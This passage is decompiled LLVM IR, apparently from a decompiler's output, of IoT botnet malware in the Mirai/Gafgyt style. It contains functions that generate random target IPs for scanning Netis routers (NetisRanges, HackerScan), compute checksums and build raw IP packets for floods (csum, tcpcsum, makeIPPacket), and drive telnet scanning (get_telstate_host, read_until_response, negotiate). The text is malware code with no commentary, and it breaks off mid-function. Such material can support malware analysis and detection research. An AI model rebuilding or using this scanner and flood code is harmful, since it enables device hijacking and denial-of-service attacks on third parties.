  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bec4, { 1, 0 }
  uselistorder label %dec_label_pc_be90, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be28, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_bd8c, { 1, 0 }
  uselistorder label %dec_label_pc_bd58, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 1, 0 }
  uselistorder label %dec_label_pc_bcf0, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_bc88, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_b9b0, { 1, 0 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
  uselistorder label %dec_label_pc_b948, { 1, 0 }
  uselistorder label %dec_label_pc_b6c4, { 1, 0 }
  uselistorder label %dec_label_pc_b690, { 1, 0 }
  uselistorder label %dec_label_pc_b65c, { 1, 0 }
  uselistorder label %dec_label_pc_b628, { 1, 0 }
  uselistorder label %dec_label_pc_b5f4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %dec_label_pc_b58c, { 1, 0 }
  uselistorder label %dec_label_pc_b558, { 1, 0 }
  uselistorder label %dec_label_pc_b524, { 1, 0 }
  uselistorder label %dec_label_pc_b4f0, { 1, 0 }
  uselistorder label %dec_label_pc_b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_b488, { 1, 0 }
  uselistorder label %dec_label_pc_b454, { 1, 0 }
  uselistorder label %dec_label_pc_b420, { 1, 0 }
  uselistorder label %dec_label_pc_b3ec, { 1, 0 }
  uselistorder label %dec_label_pc_b3b8, { 1, 0 }
  uselistorder label %dec_label_pc_b384, { 1, 0 }
  uselistorder label %dec_label_pc_b350, { 1, 0 }
  uselistorder label %dec_label_pc_b31c, { 1, 0 }
  uselistorder label %dec_label_pc_b2e8, { 1, 0 }
  uselistorder label %dec_label_pc_b2b4, { 1, 0 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
  uselistorder label %dec_label_pc_b24c, { 1, 0 }
  uselistorder label %dec_label_pc_b218, { 1, 0 }
  uselistorder label %dec_label_pc_b1e4, { 1, 0 }
  uselistorder label %dec_label_pc_b1b0, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b148, { 1, 0 }
  uselistorder label %dec_label_pc_b114, { 1, 0 }
  uselistorder label %dec_label_pc_b0e0, { 1, 0 }
  uselistorder label %dec_label_pc_b0ac, { 1, 0 }
  uselistorder label %dec_label_pc_b078, { 1, 0 }
  uselistorder label %dec_label_pc_b044, { 1, 0 }
  uselistorder label %dec_label_pc_b010, { 1, 0 }
  uselistorder label %dec_label_pc_afdc, { 1, 0 }
  uselistorder label %dec_label_pc_afa8, { 1, 0 }
  uselistorder label %dec_label_pc_af74, { 1, 0 }
  uselistorder label %dec_label_pc_af40, { 1, 0 }
  uselistorder label %dec_label_pc_af0c, { 1, 0 }
  uselistorder label %dec_label_pc_aed8, { 1, 0 }
  uselistorder label %dec_label_pc_aea4, { 1, 0 }
  uselistorder label %dec_label_pc_ae70, { 1, 0 }
  uselistorder label %dec_label_pc_ae3c, { 1, 0 }
  uselistorder label %dec_label_pc_ae08, { 1, 0 }
  uselistorder label %dec_label_pc_add4, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
  uselistorder label %dec_label_pc_ad6c, { 1, 0 }
  uselistorder label %dec_label_pc_ad38, { 1, 0 }
  uselistorder label %dec_label_pc_ad04, { 1, 0 }
  uselistorder label %dec_label_pc_acd0, { 1, 0 }
  uselistorder label %dec_label_pc_ac9c, { 1, 0 }
  uselistorder label %dec_label_pc_ac68, { 1, 0 }
  uselistorder label %dec_label_pc_ac34, { 1, 0 }
  uselistorder label %dec_label_pc_ac00, { 1, 0 }
  uselistorder label %dec_label_pc_abcc, { 1, 0 }
  uselistorder label %dec_label_pc_ab98, { 1, 0 }
  uselistorder label %dec_label_pc_ab64, { 1, 0 }
  uselistorder label %dec_label_pc_ab30, { 1, 0 }
  uselistorder label %dec_label_pc_aafc, { 1, 0 }
  uselistorder label %dec_label_pc_aac8, { 1, 0 }
  uselistorder label %dec_label_pc_aa94, { 1, 0 }
  uselistorder label %dec_label_pc_aa60, { 1, 0 }
  uselistorder label %dec_label_pc_aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_a9f8, { 1, 0 }
  uselistorder label %dec_label_pc_a9c4, { 1, 0 }
  uselistorder label %dec_label_pc_a990, { 1, 0 }
  uselistorder label %dec_label_pc_a95c, { 1, 0 }
  uselistorder label %dec_label_pc_a928, { 1, 0 }
  uselistorder label %dec_label_pc_a8f4, { 1, 0 }
  uselistorder label %dec_label_pc_a8c0, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 1, 0 }
  uselistorder label %dec_label_pc_a858, { 1, 0 }
  uselistorder label %dec_label_pc_a824, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d5b4 = load i32, i32* @r4, align 4
  %v6_d5b4 = load i32, i32* @fp, align 4
  store i32 54716, i32* %stack_var_-4, align 4
  %v2_d5b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d5b8, i32* @fp, align 4
  %v0_d5c0 = call i32 @random()
  %v2_d5d0 = urem i32 %v0_d5c0, 30
  %v4_d5e4 = mul nuw nsw i32 %v2_d5d0, 4
  %v5_d5e4 = add i32 %v4_d5e4, ptrtoint (i32* @global_var_2b1d8.474 to i32)
  %v6_d5e4 = inttoptr i32 %v5_d5e4 to i32*
  %v7_d5e4 = load i32, i32* %v6_d5e4, align 4
  %v1_d5f0 = trunc i32 %v7_d5e4 to i8
  store i8 %v1_d5f0, i8* @global_var_2b5e3.69, align 1
  %v0_d5f4 = call i32 @random()
  %v2_d604 = srem i32 %v0_d5f4, 255
  %v1_d614 = trunc i32 %v2_d604 to i8
  store i8 %v1_d614, i8* @global_var_2b5e4.70, align 1
  %v0_d618 = call i32 @random()
  %v2_d628 = srem i32 %v0_d618, 255
  %v1_d638 = trunc i32 %v2_d628 to i8
  store i8 %v1_d638, i8* @global_var_2b5e5.71, align 1
  %v0_d63c = call i32 @random()
  %v2_d64c = srem i32 %v0_d63c, 255
  %v1_d65c = trunc i32 %v2_d64c to i8
  store i8 %v1_d65c, i8* @global_var_2b5e6.72, align 1
  %v2_d660 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v2_d69c = load i8, i8* bitcast (i8** @global_var_2b5e2.68 to i8*), align 4
  %v3_d69c = zext i8 %v2_d69c to i32
  store i32 %v3_d69c, i32* @lr, align 4
  %v3_d6a8 = load i8, i8* @global_var_2b5e3.69, align 1
  %v4_d6a8 = zext i8 %v3_d6a8 to i32
  store i32 %v4_d6a8, i32* @r4, align 4
  %v3_d6b4 = load i8, i8* @global_var_2b5e4.70, align 1
  %v6_d6dc = sext i8 %v3_d6a8 to i32
  %v8_d6dc = sext i8 %v3_d6b4 to i32
  %v9_d6dc = call i32 @szprintf(i32 %v2_d660, i32 ptrtoint ([12 x i8]* @global_var_1de58.477 to i32), i32 %v3_d69c, i32 %v6_d6dc, i32 %v8_d6dc)
  store i32 %v2_d660, i32* @r0, align 4
  %v1_d6e8 = call i32 @inet_addr(i32 %v2_d660)
  store i32 %v3_d5b4, i32* @r4, align 4
  store i32 %v6_d5b4, i32* @fp, align 4
  ret i32 %v1_d6e8

; uselistorder directives
  uselistorder i32 %v2_d660, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2b5e6.72, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2b5e5.71, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2b5e4.70, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_2b5e3.69, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d720 = load i32, i32* @global_var_31848.479, align 4
  %v1_d728 = call i32 @ntohl(i32 %v2_d720)
  %v2_d734 = and i32 %v1_d728, %arg1
  %v0_d73c = call i32 @rand_cmwc()
  %v1_d748 = sub i32 -1, %arg1
  %v2_d74c = and i32 %v0_d73c, %v1_d748
  %v2_d754 = xor i32 %v2_d74c, %v2_d734
  ret i32 %v2_d754

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_d7e48 = icmp sgt i32 %arg2, 1
  br i1 %v8_d7e48, label %dec_label_pc_d794, label %dec_label_pc_d7e8

dec_label_pc_d794:                                ; preds = %entry, %dec_label_pc_d794
  %v2_d7b0 = phi i32 [ %v2_d7b4, %dec_label_pc_d794 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v5_d7b8, %dec_label_pc_d794 ], [ 0, %entry ]
  %stack_var_-36.010 = phi i32 [ %v1_d7d4, %dec_label_pc_d794 ], [ %arg2, %entry ]
  %stack_var_-32.09 = phi i8* [ %v5_d7cc, %dec_label_pc_d794 ], [ %arg1, %entry ]
  %v4_d794 = ptrtoint i8* %stack_var_-32.09 to i32
  %v2_d798 = load i8, i8* %stack_var_-32.09, align 1
  %v3_d798 = zext i8 %v2_d798 to i32
  %v1_d79c = add i32 %v4_d794, 1
  %v2_d79c = inttoptr i32 %v1_d79c to i8*
  %v3_d79c = load i8, i8* %v2_d79c, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  %v4_d7a0 = mul nuw nsw i32 %v4_d79c, 256
  %v5_d7a0 = or i32 %v4_d7a0, %v3_d798
  %v2_d7b4 = add i32 %v5_d7a0, %v2_d7b0
  %v3_d7b4 = icmp ult i32 %v2_d7b4, %v2_d7b0
  %v4_d7b8 = zext i1 %v3_d7b4 to i32
  %v5_d7b8 = add i32 %v4_d7b8, %stack_var_-40.011
  %v1_d7c8 = add i32 %v4_d794, 2
  %v5_d7cc = inttoptr i32 %v1_d7c8 to i8*
  %v1_d7d4 = add nsw i32 %stack_var_-36.010, -2
  %v8_d7e4 = icmp sgt i32 %v1_d7d4, 1
  br i1 %v8_d7e4, label %dec_label_pc_d794, label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d794, %entry
  %v2_d808 = phi i32 [ 0, %entry ], [ %v2_d7b4, %dec_label_pc_d794 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_d7cc, %dec_label_pc_d794 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_d7b8, %dec_label_pc_d794 ]
  %v7_d7e0.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_d7d4, %dec_label_pc_d794 ]
  %v7_d7e0.lcssa = icmp eq i32 %v7_d7e0.lcssa.in, 1
  br i1 %v7_d7e0.lcssa, label %dec_label_pc_d7f4, label %dec_label_pc_d870.preheader

dec_label_pc_d7f4:                                ; preds = %dec_label_pc_d7e8
  %v2_d7f8 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_d7f8 = zext i8 %v2_d7f8 to i32
  %v2_d80c = add i32 %v3_d7f8, %v2_d808
  %v3_d80c = icmp ult i32 %v2_d80c, %v2_d808
  %v4_d810 = zext i1 %v3_d80c to i32
  %v5_d810 = add i32 %v4_d810, %stack_var_-40.0.lcssa
  br label %dec_label_pc_d870.preheader

dec_label_pc_d870.preheader:                      ; preds = %dec_label_pc_d7f4, %dec_label_pc_d7e8
  %v3_d89c.ph = phi i32 [ %v2_d808, %dec_label_pc_d7e8 ], [ %v2_d80c, %dec_label_pc_d7f4 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_d7e8 ], [ %v5_d810, %dec_label_pc_d7f4 ]
  %v3_d87435 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_d87c36 = udiv i32 %v3_d89c.ph, 65536
  %v2_d88037 = or i32 %v3_d87435, %v3_d87c36
  %v3_d88838 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_d89039 = or i32 %v2_d88037, %v3_d88838
  %v2_d89440 = icmp eq i32 %v2_d89039, 0
  br i1 %v2_d89440, label %dec_label_pc_d89c, label %dec_label_pc_d820

dec_label_pc_d820:                                ; preds = %dec_label_pc_d870.preheader, %dec_label_pc_d820
  %v3_d88843 = phi i32 [ %v3_d888, %dec_label_pc_d820 ], [ %v3_d88838, %dec_label_pc_d870.preheader ]
  %v2_d88042 = phi i32 [ %v2_d880, %dec_label_pc_d820 ], [ %v2_d88037, %dec_label_pc_d870.preheader ]
  %v3_d89c41 = phi i32 [ %v2_d860, %dec_label_pc_d820 ], [ %v3_d89c.ph, %dec_label_pc_d870.preheader ]
  %v2_d834 = and i32 %v3_d89c41, add (i32 ptrtoint (i32* @global_var_10000.480 to i32), i32 -1)
  %v2_d860 = add i32 %v2_d88042, %v2_d834
  %v3_d860 = icmp ult i32 %v2_d860, %v2_d834
  %v4_d864 = zext i1 %v3_d860 to i32
  %v5_d864 = add nuw nsw i32 %v4_d864, %v3_d88843
  %v3_d874 = mul i32 %v5_d864, 65536
  %v3_d87c = udiv i32 %v2_d860, 65536
  %v2_d880 = or i32 %v3_d874, %v3_d87c
  %v3_d888 = udiv i32 %v5_d864, 65536
  %v2_d890 = or i32 %v2_d880, %v3_d888
  %v2_d894 = icmp eq i32 %v2_d890, 0
  br i1 %v2_d894, label %dec_label_pc_d870.dec_label_pc_d89c_crit_edge, label %dec_label_pc_d820

dec_label_pc_d870.dec_label_pc_d89c_crit_edge:    ; preds = %dec_label_pc_d820
  br label %dec_label_pc_d89c

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d870.dec_label_pc_d89c_crit_edge, %dec_label_pc_d870.preheader
  %v3_d89c.lcssa = phi i32 [ %v2_d860, %dec_label_pc_d870.dec_label_pc_d89c_crit_edge ], [ %v3_d89c.ph, %dec_label_pc_d870.preheader ]
  %v1_d8a8 = urem i32 %v3_d89c.lcssa, 65536
  %v3_d8b0 = xor i32 %v1_d8a8, 65535
  ret i32 %v3_d8b0

; uselistorder directives
  uselistorder i32 %v2_d880, { 1, 0 }
  uselistorder i32 %v5_d864, { 1, 0 }
  uselistorder i32 %v2_d860, { 2, 0, 3, 1 }
  uselistorder i32 %v2_d834, { 1, 0 }
  uselistorder i32 %v3_d88838, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_d89c.ph, { 2, 1, 0 }
  uselistorder i32 %v2_d808, { 0, 2, 1 }
  uselistorder i32 %v1_d7d4, { 0, 2, 1 }
  uselistorder i32 %v2_d7b4, { 0, 2, 1 }
  uselistorder i32 %v2_d7b0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d820, { 1, 0 }
  uselistorder label %dec_label_pc_d794, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_d8c4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_d8fc = add i32 %arg1, 12
  %v2_d8fc = inttoptr i32 %v1_d8fc to i32*
  %v3_d8fc = load i32, i32* %v2_d8fc, align 4
  store i32 %v3_d8fc, i32* %stack_var_-44, align 4
  %v1_d924 = call i32 @htons(i32 20)
  %v1_d948 = call i32 @malloc(i32 32)
  %v2_d958 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_d948, i32* @r0, align 4
  store i32 %v2_d958, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_d96c = call i32 @memcpy()
  %v1_d974 = add i32 %v1_d948, 12
  %v3_d978 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_d974, i32* @r0, align 4
  store i32 %v3_d978, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_d98c = call i32 @memcpy()
  %v2_d998 = inttoptr i32 %v1_d948 to i8*
  %v3_d998 = call i32 @csum(i8* %v2_d998, i32 32)
  %sext2 = mul i32 %v3_d998, 16777216
  %v3_d9a4 = ashr i32 %sext2, 31
  %v1_d9b0 = call i32 @free(i32 %v1_d948)
  %v3_d9b8 = sdiv i32 %sext2, 16777216
  %v4_d9bc = mul nsw i32 %v3_d9a4, 256
  %v4_d9c0 = and i32 %v4_d9bc, 65280
  %v5_d9c0 = or i32 %v4_d9c0, %v3_d9b8
  store i32 %v3_d8c4, i32* @fp, align 4
  ret i32 %v5_d9c0

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_d948, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp5 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_d9d4 = load i32, i32* @fp, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_d9f4 = load i8, i8* %arg1, align 1
  %v4_d9fc = zext i8 %v2_d9f4 to i32
  %v1_da00 = and i32 %v4_d9fc, 240
  %v1_da04 = or i32 %v1_da00, 5
  store i32 %v1_da04, i32* %r3.global-to-local, align 4
  %v1_da10 = trunc i32 %v1_da04 to i8
  store i8 %v1_da10, i8* %arg1, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_da40 = add i32 %tmp5, 1
  %v4_da40 = inttoptr i32 %v3_da40 to i8*
  store i8 0, i8* %v4_da40, align 1
  %v3_da44 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_da44, 20
  %v3_da58 = urem i32 %fold, 65536
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_da60 = trunc i32 %fold to i8
  %v3_da60 = add i32 %tmp5, 2
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i32, i32* %r3.global-to-local, align 4
  %v3_da64 = sdiv i32 %v0_da64, 256
  store i32 %v3_da64, i32* %r3.global-to-local, align 4
  %v1_da68 = trunc i32 %v3_da64 to i8
  %v2_da68 = load i32, i32* %r2.global-to-local, align 4
  %v3_da68 = add i32 %v2_da68, 3
  %v4_da68 = inttoptr i32 %v3_da68 to i8*
  store i8 %v1_da68, i8* %v4_da68, align 1
  %v0_da6c = call i32 @rand_cmwc()
  %v3_da78 = urem i32 %v0_da6c, 65536
  store i32 %v3_da78, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_da80 = trunc i32 %v0_da6c to i8
  %v3_da80 = add i32 %tmp5, 4
  %v4_da80 = inttoptr i32 %v3_da80 to i8*
  store i8 %v1_da80, i8* %v4_da80, align 1
  %v0_da84 = load i32, i32* %r3.global-to-local, align 4
  %v3_da844 = udiv i32 %v0_da84, 256
  %v1_da88 = trunc i32 %v3_da844 to i8
  %v2_da88 = load i32, i32* %r2.global-to-local, align 4
  %v3_da88 = add i32 %v2_da88, 5
  %v4_da88 = inttoptr i32 %v3_da88 to i8*
  store i8 %v1_da88, i8* %v4_da88, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_da94 = add i32 %tmp5, 6
  %v4_da94 = inttoptr i32 %v3_da94 to i8*
  store i8 0, i8* %v4_da94, align 1
  %v0_da98 = load i32, i32* %r3.global-to-local, align 4
  %v1_da98 = trunc i32 %v0_da98 to i8
  %v2_da98 = load i32, i32* %r2.global-to-local, align 4
  %v3_da98 = add i32 %v2_da98, 7
  %v4_da98 = inttoptr i32 %v3_da98 to i8*
  store i8 %v1_da98, i8* %v4_da98, align 1
  %v3_daa4 = add i32 %tmp5, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 -1, i8* %v4_daa4, align 1
  %v3_dab0 = add i32 %tmp5, 9
  %v4_dab0 = inttoptr i32 %v3_dab0 to i8*
  store i8 %tmp, i8* %v4_dab0, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dabc = add i32 %tmp5, 10
  %v4_dabc = inttoptr i32 %v3_dabc to i8*
  store i8 0, i8* %v4_dabc, align 1
  %v0_dac0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dac0 = trunc i32 %v0_dac0 to i8
  %v2_dac0 = load i32, i32* %r2.global-to-local, align 4
  %v3_dac0 = add i32 %v2_dac0, 11
  %v4_dac0 = inttoptr i32 %v3_dac0 to i8*
  store i8 %v1_dac0, i8* %v4_dac0, align 1
  %v2_dacc = add i32 %tmp5, 12
  %v3_dacc = inttoptr i32 %v2_dacc to i32*
  store i32 %arg3, i32* %v3_dacc, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dad8 = add i32 %tmp5, 16
  %v3_dad8 = inttoptr i32 %v2_dad8 to i32*
  store i32 %arg2, i32* %v3_dad8, align 4
  store i32 %v3_d9d4, i32* @fp, align 4
  ret i32 %v0_da6c

; uselistorder directives
  uselistorder i32 %v0_da6c, { 1, 2, 0 }
  uselistorder i32 %v3_da64, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp5, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_db00 = icmp sgt i32 %arg1, 2
  br i1 %v8_db00, label %dec_label_pc_db10, label %dec_label_pc_db20

dec_label_pc_db10:                                ; preds = %entry
  %v1_db14 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %entry, %dec_label_pc_db10
  %storemerge1 = phi i32 [ 0, %dec_label_pc_db10 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_db20, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_db34 = load i32, i32* @fp, align 4
  %v1_db48 = add i32 %arg1, 4
  %v2_db48 = inttoptr i32 %v1_db48 to i32*
  %v3_db48 = load i32, i32* %v2_db48, align 4
  store i32 %v3_db48, i32* @r0, align 4
  %v1_db54 = call i32 @__GI_inet_ntoa(i32 %v3_db48)
  store i32 %v3_db34, i32* @fp, align 4
  ret i32 %v1_db54
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_db6c = load i32, i32* @fp, align 4
  store i32 56180, i32* %stack_var_-4, align 4
  %v2_db70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_db70, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_db98 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_dbac = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_dbbc = load i8, i8* %arg3, align 1
  %v2_dbc0 = icmp eq i8 %v2_dbbc, -1
  br i1 %v2_dbc0, label %dec_label_pc_dbc8, label %dec_label_pc_dbdc

dec_label_pc_dbc8:                                ; preds = %entry
  %v4_dbd8 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %entry, %dec_label_pc_dbc8
  %v3_dbe0 = load i32, i32* %stack_var_0, align 4
  %v3_dbe4 = call i32 @contains_string(i32 %tmp, i32 %v3_dbe0)
  %v2_dbec = icmp ne i32 %v3_dbe4, 0
  %. = zext i1 %v2_dbec to i32
  store i32 %v3_db6c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_dbdc, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc5c.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_dc1c = load i32, i32* @fp, align 4
  store i32 %v3_dc1c, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_dc48 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_dc5c

dec_label_pc_dc5c:                                ; preds = %dec_label_pc_dc5c.lr.ph, %dec_label_pc_dc5c
  %storemerge25 = phi i32 [ 0, %dec_label_pc_dc5c.lr.ph ], [ %v1_dc70, %dec_label_pc_dc5c ]
  %v5_dc68 = mul nuw nsw i32 %storemerge25, 4
  %v6_dc68 = add i32 %v5_dc68, %v2_dc48
  %v7_dc68 = inttoptr i32 %v6_dc68 to i32*
